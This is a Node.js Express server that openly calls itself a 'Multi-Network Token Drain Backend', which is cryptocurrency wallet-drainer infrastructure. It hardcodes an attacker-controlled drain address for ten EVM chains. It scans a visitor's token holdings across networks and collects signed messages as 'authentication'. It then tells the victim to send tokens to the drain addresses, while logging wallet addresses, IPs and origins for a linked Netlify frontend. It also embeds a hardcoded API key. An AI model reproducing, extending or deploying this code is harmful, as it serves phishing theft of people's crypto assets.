const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');
const Web3 = require('web3');

const app = express();

// ==================== MULTI-NETWORK DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Networks
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  
  // Non-EVM (placeholder addresses - replace with actual)
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
};

// ==================== RPC PROVIDERS ====================
const RPC_URLS = {
  1: `https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY`,
  56: "https://bsc-dataseed1.binance.org/",
  137: "https://polygon-rpc.com",
  42161: "https://arb1.arbitrum.io/rpc",
  10: "https://mainnet.optimism.io",
  8453: "https://mainnet.base.org",
  43114: "https://api.avax.network/ext/bc/C/rpc",
  250: "https://rpc.ftm.tools",
  100: "https://rpc.gnosischain.com",
  42220: "https://forno.celo.org",
};

// ==================== COVALENT API ====================
const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";

// ==================== APP SETUP ====================
const corsOptions = {
  origin: [
    'https://playful-cuchufli-81c9d6.netlify.app',
    'http://localhost:3000',
    'http://localhost:5173'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Origin'],
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json());

// ==================== DATABASE ====================
const transactionLogs = new Map();
const multiNetworkAuths = new Map();
const tokenCache = new Map();

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm' },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm' },
];

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Multi-Network Token Drain Backend API',
    version: '3.0.0',
    status: 'online',
    mode: 'LOG_ONLY',
    note: 'Multi-network support with separate drain addresses',
    networks: NETWORKS.length,
    endpoints: {
      'POST /multidrain': 'Multi-network authentication',
      'POST /drain': 'Log single network transaction',
      'GET /tokens/:address/:networkId': 'Get tokens for specific network',
      'GET /tokens/:address': 'Get tokens across all networks',
      'GET /networks': 'List all supported networks',
      'GET /health': 'Health check',
      'GET /logs/:address': 'Get all transaction logs'
    },
    timestamp: new Date().toISOString()
  });
});

// ==================== MULTI-NETWORK AUTHENTICATION ====================
app.post('/multidrain', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const timestamp = new Date().toISOString();
  
  try {
    console.log(`🔐 [${requestId}] Multi-network auth received`);
    
    const { 
      fromAddress,
      signature,
      message,
      networks
    } = req.body;
    
    // Validation
    if (!fromAddress || !ethers.isAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid fromAddress required",
        requestId
      });
    }
    
    if (!signature || !message) {
      return res.status(400).json({ 
        success: false,
        error: "Signature and message required",
        requestId
      });
    }
    
    // Verify signature (basic check)
    const recoveredAddress = ethers.verifyMessage(message, signature);
    if (recoveredAddress.toLowerCase() !== fromAddress.toLowerCase()) {
      return res.status(400).json({ 
        success: false,
        error: "Signature verification failed",
        requestId
      });
    }
    
    // Store multi-network auth
    const authEntry = {
      id: requestId,
      fromAddress,
      signatureHash: crypto.createHash('sha256').update(signature).digest('hex').substring(0, 16),
      message,
      networks: networks || NETWORKS,
      timestamp,
      ip: req.ip,
      origin: req.headers.origin
    };
    
    multiNetworkAuths.set(`${fromAddress}:${requestId}`, authEntry);
    
    // Prepare response with network-specific drain addresses
    const networkData = NETWORKS.map(network => ({
      id: network.id,
      name: network.name,
      symbol: network.symbol,
      type: network.type,
      drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
      status: 'authenticated'
    }));
    
    console.log(`✅ [${requestId}] Multi-network auth successful for ${fromAddress}`);
    console.log(`   Networks: ${networkData.length}`);
    
    res.json({
      success: true,
      message: "Multi-network authentication successful",
      requestId,
      data: {
        authenticatedAt: timestamp,
        fromAddress,
        networks: networkData,
        totalNetworks: networkData.length
      },
      instructions: {
        evm: "Send tokens directly to network-specific drain addresses",
        non_evm: "Non-EVM chains require manual transfer",
        note: "Gas fees are paid by sender"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Multi-network auth error:`, error);
    res.status(500).json({
      success: false,
      error: "Multi-network authentication failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== SINGLE NETWORK DRAIN ====================
app.post('/drain', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const timestamp = new Date().toISOString();
  
  try {
    const { 
      fromAddress,
      amount, 
      chainId, 
      signature,
      message,
      tokenType = 'native',
      tokenAddress,
      transactionHash
    } = req.body;
    
    // Validation
    if (!fromAddress || !ethers.isAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid fromAddress required",
        requestId
      });
    }
    
    // Verify signature if provided
    if (signature && message) {
      try {
        const recoveredAddress = ethers.verifyMessage(message, signature);
        if (recoveredAddress.toLowerCase() !== fromAddress.toLowerCase()) {
          console.warn(`⚠️ [${requestId}] Signature mismatch for ${fromAddress}`);
        }
      } catch (sigError) {
        console.warn(`⚠️ [${requestId}] Signature verification error:`, sigError.message);
      }
    }
    
    // Get drain address for chain
    const drainAddress = DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1];
    
    // Log transaction
    const logEntry = {
      id: requestId,
      fromAddress,
      toAddress: drainAddress,
      amount: amount || 'unknown',
      chainId: chainId || 1,
      tokenType,
      tokenAddress: tokenAddress || null,
      signature: signature ? `${signature.substring(0, 20)}...` : null,
      message: message || null,
      transactionHash: transactionHash || null,
      timestamp,
      loggedAt: timestamp,
      ip: req.ip,
      origin: req.headers.origin
    };
    
    // Store log
    if (!transactionLogs.has(fromAddress)) {
      transactionLogs.set(fromAddress, []);
    }
    transactionLogs.get(fromAddress).push(logEntry);
    
    console.log(`✅ [${requestId}] Transaction logged:`);
    console.log(`   Network: ${chainId || 1}`);
    console.log(`   From: ${fromAddress}`);
    console.log(`   To: ${drainAddress}`);
    console.log(`   Amount: ${amount || 'N/A'}`);
    
    res.json({
      success: true,
      message: "Transaction logged successfully",
      requestId,
      data: {
        loggedAt: timestamp,
        fromAddress,
        toAddress: drainAddress,
        network: chainId || 1,
        nextStep: "Send transaction from your wallet"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Logging error:`, error);
    res.status(500).json({
      success: false,
      error: "Logging failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== GET TOKENS FOR SPECIFIC NETWORK ====================
app.get('/tokens/:address/:networkId', async (req, res) => {
  try {
    const { address, networkId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    // Check cache first
    const cacheKey = `${address}:${networkId}`;
    const cached = tokenCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < 60000) { // 1 minute cache
      return res.json(cached.data);
    }
    
    console.log(`🔍 Fetching tokens for ${address} on network ${networkId}`);
    
    let tokens = [];
    const network = NETWORKS.find(n => n.id.toString() === networkId.toString());
    
    if (!network) {
      return res.status(400).json({
        success: false,
        error: `Network ${networkId} not supported`
      });
    }
    
    if (network.type === 'evm' && typeof networkId === 'string' && !isNaN(networkId)) {
      // EVM network - use Covalent
      try {
        const response = await fetch(
          `https://api.covalenthq.com/v1/${networkId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
        );
        
        if (response.ok) {
          const data = await response.json();
          const items = data.data?.items || [];
          
          tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
              const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
              const value = (t.quote_rate || 0) * amount;
              
              return {
                symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
                name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
                amount: amount,
                value: value,
                contractAddress: t.contract_address,
                isNative: t.native_token || false,
                decimals: t.contract_decimals || 18,
                logoUrl: t.logo_url,
                networkId: parseInt(networkId),
                drainAddress: DRAIN_ADDRESSES[networkId]
              };
            });
        }
      } catch (covalentError) {
        console.log(`Covalent failed for ${network.name}:`, covalentError.message);
      }
      
      // Add native token if not already included
      if (tokens.length === 0 || !tokens.some(t => t.isNative)) {
        try {
          const rpcUrl = RPC_URLS[networkId];
          if (rpcUrl) {
            const provider = new ethers.JsonRpcProvider(rpcUrl);
            const balance = await provider.getBalance(address);
            const ethAmount = parseFloat(ethers.formatEther(balance));
            
            if (ethAmount > 0.0001) { // Minimum threshold
              tokens.unshift({
                symbol: network.symbol,
                name: network.name,
                amount: ethAmount,
                value: 0, // Would need price API
                contractAddress: null,
                isNative: true,
                decimals: 18,
                logoUrl: null,
                networkId: parseInt(networkId),
                drainAddress: DRAIN_ADDRESSES[networkId]
              });
            }
          }
        } catch (rpcError) {
          console.log(`RPC failed for ${network.name}:`, rpcError.message);
        }
      }
    } else {
      // Non-EVM network - return placeholder
      tokens = [{
        symbol: network.symbol,
        name: network.name,
        amount: 0,
        value: 0,
        contractAddress: null,
        isNative: true,
        decimals: network.symbol === 'BTC' ? 8 : 18,
        logoUrl: null,
        networkId: network.id,
        drainAddress: DRAIN_ADDRESSES[network.id],
        note: "Non-EVM chain - manual verification needed"
      }];
    }
    
    const responseData = {
      success: true,
      data: {
        address: address,
        network: {
          id: network.id,
          name: network.name,
          type: network.type
        },
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0),
          scannedAt: new Date().toISOString()
        }
      }
    };
    
    // Cache the response
    tokenCache.set(cacheKey, {
      timestamp: Date.now(),
      data: responseData
    });
    
    res.json(responseData);
    
  } catch (error) {
    console.error("Tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== GET TOKENS ACROSS ALL NETWORKS ====================
app.get('/tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🌐 Scanning all networks for ${address}`);
    
    const allTokens = {};
    const promises = [];
    
    // Scan EVM networks in parallel
    for (const network of NETWORKS.filter(n => n.type === 'evm' && typeof n.id === 'number')) {
      promises.push(
        fetch(`http://${req.headers.host}/tokens/${address}/${network.id}`)
          .then(res => res.json())
          .then(data => {
            if (data.success && data.data.tokens.length > 0) {
              allTokens[network.id] = {
                network: {
                  id: network.id,
                  name: network.name,
                  symbol: network.symbol,
                  type: network.type,
                  drainAddress: DRAIN_ADDRESSES[network.id]
                },
                tokens: data.data.tokens,
                totalValue: data.data.summary.totalValue
              };
            }
          })
          .catch(error => {
            console.log(`Failed to scan ${network.name}:`, error.message);
          })
      );
    }
    
    await Promise.allSettled(promises);
    
    // Calculate totals
    const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
    
    res.json({
      success: true,
      data: {
        address,
        networks: Object.keys(allTokens).length,
        tokensByNetwork: allTokens,
        summary: {
          totalNetworks: Object.keys(allTokens).length,
          totalTokens,
          totalValue,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("Multi-network scan error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== GET NETWORKS ====================
app.get('/networks', (req, res) => {
  res.json({
    success: true,
    networks: NETWORKS.map(network => ({
      ...network,
      drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
      rpcAvailable: !!RPC_URLS[network.id],
      type: network.type
    }))
  });
});

// ==================== GET LOGS ====================
app.get('/logs/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    const logs = transactionLogs.get(address) || [];
    const auths = Array.from(multiNetworkAuths.entries())
      .filter(([key]) => key.startsWith(`${address}:`))
      .map(([_, value]) => value);
    
    res.json({
      success: true,
      data: {
        address,
        transactionLogs: logs,
        multiNetworkAuths: auths,
        statistics: {
          totalTransactions: logs.length,
          totalMultiNetworkAuths: auths.length,
          networksUsed: [...new Set(logs.map(l => l.chainId))],
          lastActivity: logs.length > 0 ? logs[logs.length - 1].timestamp : null
        }
      }
    });
    
  } catch (error) {
    console.error("Logs endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    stats: {
      networks: NETWORKS.length,
      cachedTokens: tokenCache.size,
      totalLogs: Array.from(transactionLogs.values()).reduce((sum, logs) => sum + logs.length, 0),
      multiNetworkAuths: multiNetworkAuths.size
    },
    memory: {
      rss: `${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB`,
      heap: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
    }
  });
});

// ==================== ERROR HANDLER ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API info",
      "POST /multidrain": "Authenticate all networks",
      "POST /drain": "Log single transaction",
      "GET /tokens/:address/:networkId": "Get tokens for network",
      "GET /tokens/:address": "Get tokens across all networks",
      "GET /networks": "List supported networks",
      "GET /logs/:address": "Get transaction logs",
      "GET /health": "Health check"
    }
  });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Multi-Network Token Drain Backend v3.0 running on port ${PORT}`);
  console.log(`🌐 CORS enabled`);
  console.log(`🔧 Mode: LOG ONLY`);
  console.log(`📡 Networks: ${NETWORKS.length} (${NETWORKS.filter(n => n.type === 'evm').length} EVM)`);
  console.log(`💰 Drain addresses configured per network`);
  console.log(`✅ Ready for multi-network operations`);
});
